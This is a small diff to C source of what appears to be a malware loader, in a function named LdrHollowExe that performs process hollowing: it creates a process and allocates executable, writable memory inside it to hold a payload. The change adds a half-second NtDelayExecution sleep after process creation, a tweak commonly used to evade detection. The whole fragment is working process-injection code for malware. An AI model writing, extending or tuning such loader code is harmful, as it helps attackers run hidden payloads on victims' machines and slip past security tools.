@@ -127,6 +127,10 @@ BOOL LdrHollowExe(LdrTask info) {
 	}
 	DBGA("[*] Created Process\n");
 
+	LARGE_INTEGER i;
+	i.QuadPart = -(500LL * 10000);
+	ldr->win32->NtDelayExecution(FALSE, &i);
+
 	PVOID Base = NULL;
 	SIZE_T Size = info.DataSize;
 	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(pi.hProcess, &Base, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
